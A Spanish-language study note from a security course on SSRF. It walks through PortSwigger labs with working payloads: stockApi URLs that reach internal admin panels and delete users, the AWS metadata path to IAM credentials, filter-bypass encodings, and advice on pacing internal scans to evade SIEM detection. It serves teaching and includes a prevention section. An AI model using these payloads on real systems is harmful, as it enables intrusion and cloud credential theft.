

> [!info] Relacionado con
> [[Vulnerabilidades Web - OWASP Top 10 y Burp Suite]] · [[Burp Suite - Framework de Auditoría]] · [[OWASP Top 10 - CVE CVSS CWE]] · [[SSTI - Server-Side Template Injection]]

---

## ① Definición

**SSRF (Server-Side Request Forgery)** = el servidor ejecuta peticiones HTTP controladas por el atacante.

```
Atacante → envía URL/param → Servidor hace la petición → Responde al atacante
```

> [!important] La clave
> El servidor actúa como **proxy involuntario**. El atacante no ve la petición directamente, sino que la servidor la ejecuta por él y devuelve el resultado.

> [!tip] Analogía del mensajero (de clase)
> El servidor es el empleado con tarjeta de acceso: tú no entrás en las oficinas, pero le pasás una nota y él la introduce por ti. Goza de la confianza interna que vos no tenés. Si controlás la URL que el servidor visita, él hace el trabajo sucio.

> [!warning] SSRF ≠ LFI
> El SSRF trabaja a nivel de **peticiones HTTP**. NO permite leer ficheros locales arbitrarios como el LFI (`/etc/passwd`, `id_rsa`). El destino debe ser un recurso alcanzable por HTTP/HTTPS: si en una IP interna hay servicios sin web, el SSRF no llega hasta ahí.

| Aspecto | Path Traversal / LFI | SSRF |
|---------|----------------------|------|
| Indicio típico | Parámetro que carga un fichero (imagen, PDF…) | Parámetro que contiene o construye una **URL** |
| Qué se obtiene | Ficheros locales del servidor | Respuestas de recursos web internos (paneles, APIs, metadata) |
| Vector | Escapar del directorio con `../../` | Sustituir la URL destino por una interna |
| Nivel de acceso | Sistema de ficheros | Red interna vía HTTP |

**Superficies donde puede vivir un SSRF:**

- **Cuerpo de la petición (data):** el caso más habitual (p. ej. `stockApi` en un POST).
- **Cabeceras:** `Referer`, `X-Forwarded-For` u otras cabeceras propias que añada la empresa. Si una cabecera contiene una URL, pruébala.

> [!note] La URL no siempre lleva `http://` visible
> A veces solo aparece un valor tipo `stock.weliketoshop.net` o una ruta parcial, y el servidor añade el esquema por detrás. Si ves directorios/rutas dentro del valor, trátalo como URL y quitá el URL-encode con el Decoder para verlo claro.

---

## ② 3 contextos canónicos

| Contexto | Dirección | Qué se obtiene |
|----------|-----------|----------------|
| **Localhost** | `http://127.0.0.1` o `http://localhost` | Servicios internos del propio servidor (paneles admin, APIs internas) |
| **Red interna** | `http://192.168.x.x`, `http://10.x.x.x` | Otros servidores de la red corporativa inalcanzables externamente |
| **AWS Metadata** | `http://169.254.169.254` | Credenciales IAM, configuración de la instancia EC2 |

> [!warning] AWS Metadata es CRÍTICO
> En entornos cloud, la metadata devuelve **credenciales temporales de IAM** que pueden comprometer toda la infraestructura. Siempre probar `http://169.254.169.254/latest/meta-data/`.

**Navegación del árbol de metadata AWS:**

```bash
# 1. Índice de categorías disponibles
stockApi=http://169.254.169.254/latest/meta-data/

# 2. Profundizar hasta credenciales IAM
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 3. Obtener nombre del rol asignado a la instancia
# 4. Última petición con el nombre del rol
http://169.254.169.254/latest/meta-data/iam/security-credentials/nombre-del-rol
```

La última petición devuelve `AccessKeyId`, `SecretAccessKey` y `Token`: con ellas se autentica contra cualquier servicio AWS con los permisos del rol (S3, RDS, Lambda, EC2…).

> [!important] Regla de oro en cloud
> **SIEMPRE** probar `169.254.169.254` (AWS) / `metadata.google.internal` (GCP) / `169.254.169.254` con header `Metadata: true` (Azure) como primer intento. SSRF + Metadata = Cloud Admin.

---

## ③ Bypasses de restricciones

### Blacklist vs Whitelist (leer el error)

- **Blacklist** (lista negra): el servidor **bloquea ciertas palabras** (`localhost`, `127.0.0.1`, `admin`). El error dice "bloqueado por seguridad" sin exigir nada. Se bypassea con representaciones alternativas.
- **Whitelist** (lista blanca): el servidor **exige que aparezca algo concreto** ("external stock check host must contain X"). Más robusta, pero también se salta abusando del formato de URL.

> [!tip] Cual es cuál se lee en el código de error
> Si dice "debe contener X" → whitelist. Si bloquea genérico → asumí blacklist y, si no cede, pasá a lógica de whitelist.

| Técnica | Descripción | Ejemplo |
|---------|-------------|---------|
| **IP decimal** | Convertir IP a número decimal | `2130706433` = `127.0.0.1` |
| **IP octal** | Usar notación octal | `0177.0.0.1` = `127.0.0.1` |
| **IP abreviada** | Forma mínima de loopback | `127.1` = `127.0.0.1` (verificar con `ping 127.1`) |
| **IPv6 loopback** | Filtros solo miran IPv4 | `http://[::1]/` |
| **DNS trick** | Dominio que resuelve a interna | `localtest.me`, `lvh.me` → `127.0.0.1` |
| **Open redirect chain** | Encadenar redirect para evadir validación | URL propia de la app que redirige a interna |
| **UserInfo + Fragment** | Abuso de anatomía de URL | `http://allowed.com@127.0.0.1/` o `#@` |
| **Encoding 1x/2x/3x** | Codificar caracteres filtrados | `%61dmin` → `%2561dmin` → `%252561dmin` |
| **Double encoding** | Codificar el encode | `%252e%252e%252f` (doble `%25`) |
| **Subdominio controlado** | Regex suelta `endsWith` | `allowed.com.evil.com` |

> [!important] Regla del encoding
> **El validador decodifica 1 vez. El backend decodifica N veces.** Si N > 1, encoding (N−1)x bypassa el filtro. Siempre probar 1x, 2x, 3x — no 200.

> [!tip] No os memorices payloads
> **Entiende la LÓGICA**: el servidor valida la URL de entrada. Si un filtro bloquea `127.0.0.1`, busca la misma dirección en otro formato. El objetivo siempre es el mismo: hacer que el servidor pida a un destino interno.

### Bypass por Open Redirect (filtro solo-URLs-propias)

Cuando el filtro obliga a que la URL sea **de la propia aplicación**:

```
1. Filtro evalúa stockApi → ve /product/nextProduct (URL legítima) → OK
2. Servidor procesa → sigue la redirección automáticamente
3. Redirect apunta a 192.168.0.12:8080/admin → contenido interno devuelto
```

```
stockApi=/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin
```

> [!warning] El filtro valida el destino inmediato, no el final
> No comprueba que esa URL interna a su vez haga un Open Redirect. Ese es el fallo del "doble salto". El path hay que enviarlo URL-encodeado; si no, Burp da "Missing parameter" (problema de formato, no del SSRF).

> [!important] Contraprueba: ¿lo hace el servidor o yo?
> Si intentás el redirect desde el navegador o el botón "next product", lo hacés vos y **no hay SSRF**. Solo funciona cuando el redirect lo ejecuta el servidor desde dentro de `stockApi`.

### Bypass de Whitelist (userinfo @ + fragmento #)

Anatomía completa de una URL:

```
esquema://[userinfo@]host[:puerto][/ruta][?query][#fragmento]
ejemplo:  http://user:pass@panel.academics.es:8080/admin?id=1#seccion
```

| Parte | Qué es | Notas |
|-------|--------|-------|
| Esquema | `http` / `https` | Protocolo |
| userinfo | `usuario:contraseña@` | Autenticación básica; termina en `@`. **Aquí está el truco** |
| host | Dominio o IP | Lo que la whitelist obliga a que aparezca |
| puerto | `:8080` | Opcional |
| ruta | `/admin` | Siempre **tras** el host (posición fija) |
| query | `?username=carlos` | Parámetros |
| fragmento | `#seccion` | **Nunca se envía al servidor**: como un comentario en SQL |

**Payload de whitelist:**

```
https://stock.weliketoshop.net@localhost/admin#stock.weliketoshop.net
```

Lectura: `stock.weliketoshop.net` queda como **user-info** (satisface "debe contener el host"), `localhost` es el **host real**, `/admin` va al final, y el `#...` se descarta. El `#` puede necesitar **doble URL-encode** (`%2523`):

```
# 1) # simple: URL válida pero el servidor la rechaza
stockApi=http://localhost#@stock.weliketoshop.net/admin
# 2) # con un solo URL-encode (%23): sigue sin colar
stockApi=http://localhost%23@stock.weliketoshop.net/admin
# 3) # con DOBLE URL-encode (%2523): OK → acceso a /admin
stockApi=http://localhost%2523@stock.weliketoshop.net/admin
# 4) Acción final: eliminar usuario carlos
stockApi=http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos
```

> [!warning] `/admin` va SIEMPRE al final, después del host real
> Si la ponés antes del `@`, el servidor la interpreta como parte del dominio (un dominio no lleva barras) y falla.

### Descubrimiento de red interna con Intruder

Cuando localhost no da nada, se busca la **red interna** (p. ej. `192.168.0.x`):

1. Enviar la petición Check stock a **Intruder**.
2. En **Positions**, marcar solo el **último octeto**: `http://192.168.0.§1§:8080/admin`.
3. En **Payloads**, tipo **Numbers**, rango 1 a 255, paso 1.
4. (Recomendado) **Resource pool**: 1 petición por segundo para no hacer ruido.
5. Ordenar por **Status code / Length**: la IP del almacén devuelve 400/500; la del panel admin un **200** con longitud distinta.

Para IP + puerto a la vez se usa **Cluster bomb** con dos listas. Es, en la práctica, un escaneo de red interna hecho a través del SSRF — pero **solo alcanza servicios HTTP**. No lances los 65.535 puertos: montá un diccionario de puertos web probables (1000–3000), descartando 22, 21, 23, 53, 445…

> [!warning] OpSec: Resource pool 1 req/seg no es paranoia
> Un escaneo interno masivo desde SSRF = alerta en SIEM = te pillan. Fragmentá: 20 IPs hoy, 20 mañana. Paciencia.

> [!note] Instancias dinámicas
> Cada instancia de laboratorio es distinta: URL del lab, productId e IP interna cambian por alumno. No copies la IP del compañero; descubrela en tu propia sesión. La ruta de borrado te la da el panel al pasar el ratón sobre el botón Delete.

---

## ④ Blind SSRF

Cuando el servidor **no devuelve** la respuesta de la petición interna en la respuesta HTTP.

### Detección con Burp Collaborator

1. Crear un dominio Collaborator
2. Inyectarlo como parámetro: `url=http://YOUR-COLLABORATOR.burpcollaborator.net`
3. Si el servidor hace la petición → aparece un hit en Collaborator
4. Confirmar SSRF aunque no veas la respuesta

```
# Interacción esperada en Collaborator:
[+] DNS: A query for xyz123.collaborator.net from 10.0.0.5
[+] HTTP: GET / from 10.0.0.5
```

> [!note] Blind SSRF es igual de peligroso
> Aunque no veas la respuesta, el servidor **sí hizo la petición**. Sirve para: confirmar existencia de servicios internos, exfiltrar datos por DNS, y ejecutar webhooks internos.

> [!tip] Collaborator vs Interactsh
> **Burp Collaborator**: integrado en Burp Pro, UI cómoda, polling automático. **Interactsh** (projectdiscovery): open source, CLI, self-hosted, gratis: `interactsh-client -server interactsh.projectdiscovery.io`.

**Explotación avanzada ciega (avanzado):**

- **Out-of-band exfil:** el payload ejecuta un comando que contacta con el Collaborator.
- **Encadenamiento:** SSRF ciego → RCE en servicio interno → reverse shell.
- **Time-based:** `stockApi=http://localhost:8080/delay/10` → medir latencia de respuesta.

---

## ⑤ Checklist mental (flowchart)

```
¿El servidor acepta URL/parámetros de usuario?
 → SÍ → Probar localhost (127.0.0.1, 0.0.0.0, localhost, [::1])
 → ¿Responde algo? → SSRF confirmado
 → No responde → Probar red interna (10.x, 192.168.x)
 → BLOQUEA la IP directa → LEER EL ERROR:
    → "bloqueado por seguridad" = blacklist → bypasses:
       → IP decimal/octal/abreviada (127.1), IPv6 (::1)
       → DNS trick (lvh.me, localtest.me)
       → Encoding 1x/2x/3x
    → "debe contener X" = whitelist → anatomía de URL:
       → userinfo@host + fragmento # (%2523)
    → "solo URLs de la app" = open redirect chain
 → ¿No devuelve contenido? → Blind SSRF
 → Probar Collaborator/Interactsh para confirmar
 → ¿Red interna expuesta? → Intruder (octeto 1-254 + puertos web)
```

> [!important] Regla de oro
> En cloud, **SIEMPRE** probar `169.254.169.254` (AWS) / `metadata.google.internal` (GCP) / `169.254.169.254` + header `Metadata: true` (Azure) como primer intento. SSRF + Metadata = Cloud Admin.

---

## ⑥ Casos y labs de PortSwigger

### Lab básico — SSRF contra localhost

1. Abrir **Check stock** e interceptar el POST `/product/stock` con parámetro `stockApi`.
2. En Repeater: decodificar cuerpo (Ctrl+Shift+U), sustituir `stockApi` por `http://localhost/admin`, recodificar (Ctrl+U).
3. La respuesta muestra el panel interno con usuarios (wiener, carlos).
4. Borrar a carlos apuntando la URL de borrado que revela el panel: `stockApi=http://localhost/admin/delete?username=carlos`.

> [!warning] El borrado también lo hace el servidor
> Verlo en la respuesta (el panel) lo hace el servidor por ti, pero si hacés clic en el botón Delete del panel renderizado, ese clic lo lanzás vos desde fuera y **NO funciona**. La acción destructiva debe viajar dentro de `stockApi`.

### Lab intermedio — SSRF contra red interna

El panel admin vive en otra IP (`192.168.0.X:8080`), desconocida. Se descubre con Intruder (ver §③). Una vez encontrada: `stockApi=http://192.168.0.120:8080/admin/delete?username=carlos`.

### Labs avanzados (sesión 21/07 y repaso 24/07)

| Lab | Filtro | Bypass clave |
|-----|--------|--------------|
| Blacklist | Bloquea `localhost`, `127.0.0.1`, `admin` | `127.1` + `%61dmin` (doble encode si hace falta) |
| Solo URLs propias | Rechaza externos | Open redirect encadenado (`nextProduct?path=…`) |
| Whitelist | Exige host concreto | `userinfo@host` + `#` doble-encodeado (`%2523`) |

> [!note] Nivel del bypass de whitelist
> No cae en eJPT, pero sí es realista en auditorías de empresa con whitelists en parámetros. Conocimiento de nivel alto.

---

## ⑦ PortSwigger Labs

> [!tip] Practicar en PortSwigger Web Security Academy
> Los labs de SSRF cubren desde básico hasta bypasses avanzados:
> - SSRF with filter bypass from internal network
> - SSRF with filter bypass via URL resolution
> - Blind SSRF with out-of-band detection
> - SSRF via Webhook
> - SSRF with filter bypass via open redirection
> - SSRF with whitelist-based input filter bypass

---

## ⑧ Herramientas

| Herramienta | Objetivo |
|------------|----------|
| **Burp Suite (Repeater)** | Enviar y modificar peticiones con payloads SSRF (Ctrl+R) |
| **Burp Intruder** | Iterar IPs, puertos, formatos de bypass (Numbers 1-255; Cluster bomb IP+puerto) |
| **Burp Collaborator** | Detección de Blind SSRF vía DNS/HTTP callbacks (Pro) |
| **Burp Decoder** | URL-encode / decode (Ctrl+U / Ctrl+Shift+U); doble encode `%2523` |
| **Burp Resource pool** | Limitar concurrencia (1 req/seg) — OpSec |
| **Interactsh** | Alternativa open source a Collaborator (CLI, self-hosted) |
| **curl** | Testing rápido de SSRF desde terminal |
| **ping** | Verificar resolución de IP abreviada (`ping 127.1`) |

---

## ⑨ Prevención (lado defensivo)

- **Whitelist de destinos permitidos** + validación estricta del destino final (no solo la cadena de entrada).
- **Control de redirecciones:** los redirects esconden URLs; validar el destino tras seguirlos.
- Atención a **userinfo** (`usuario@host`) y **fragmentos** (`#`) en la URL.
- **Librerías/parsers robustos** y bloqueo a nivel de red (el servidor no debería alcanzar metadata/link-local si no hace falta).
- La **blacklist casi siempre se acaba evadiendo**; la whitelist es más sólida.

> [!warning] Errores comunes
> Intentar clicar botones del panel renderizado (lo hacés vos, no el servidor). Copiar la IP/productId del compañero (instancias distintas). Con un solo URL-encode rendirse pronto — probar doble. Encodear la URL entera "por si acaso" (puede disparar bloqueo por caracteres especiales). Codificar 200 veces: sin sentido.

> [!note] Ética y alcance
> Todo esto se practica en laboratorios autorizados (PortSwigger) y entornos propios. SSRF sí aparece en auditorías reales — y en OWASP Top 10 como **A10**.

---

## Checklist de repaso

- [ ] ¿Sé explicar qué es SSRF y por qué el servidor ejecuta las peticiones?
- [ ] ¿Conozco los 3 contextos canónicos (localhost, red interna, AWS metadata)?
- [ ] ¿Entiendo al menos 3 técnicas de bypass?
- [ ] ¿Sé qué es Blind SSRF y cómo detectarlo con Collaborator?
- [ ] ¿Puedo seguir el flowchart mental de SSRF en un lab?
- [ ] ¿Entiendo que SSRF está en OWASP Top 10 A10?
- [ ] ¿Distingo blacklist de whitelist leyendo el código de error?
- [ ] ¿Sé desglosar una URL: esquema, userinfo, host, puerto, ruta, query y fragmento?
- [ ] ¿Recuerdo el payload de whitelist con `#` doble-encodeado (`%2523`)?
- [ ] ¿Sé encadenar un Open Redirect y por qué debe ejecutarlo el servidor?
- [ ] ¿Aplico Resource pool 1 req/seg como OpSec al escanear la red interna?
- [ ] ¿Sé navegar el árbol de metadata AWS hasta las credenciales IAM?









---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Joselu/MODULO3/resumen_master_clase48.md|resumen_master_clase48]] — Funcional, Open Redirect, XXE
- [[Path Traversal - 6 Casos y Bypasses.md|Path Traversal - 6 Casos y Bypasses]] — Path Traversal / LFI, Testing, XXE
- [[../../apuntes Chema/PortSwigger - SSRF y cierre SSTI.md|PortSwigger - SSRF y cierre SSTI]] — Funcional, Open Redirect, Seguridad
- [[../../apuntes Andres/20.07.2026 PortSwigger SSRF.md|20.07.2026 PortSwigger SSRF]] — Funcional, Path Traversal / LFI, XXE
- [[../../apuntes Chema/SSRF - PortSwigger.md|SSRF - PortSwigger]] — Funcional, Path Traversal / LFI, Seguridad

### 🌐 Cross-Dominio

- [[../../../programacion/Node/seguridad_node.md|seguridad_node]] — Programacion: Funcional, Seguridad, Testing
- [[../../../programacion/Ciberseguridad/wordpress_security.md|wordpress_security]] — Programacion: Desarrollo Web, Seguridad, Testing

> #burpsuite #cli #cloud_base #funcional #lfi #open_redirect #redes #redes_ciber #seguridad #ssrf #ssti #testing #web #xxe
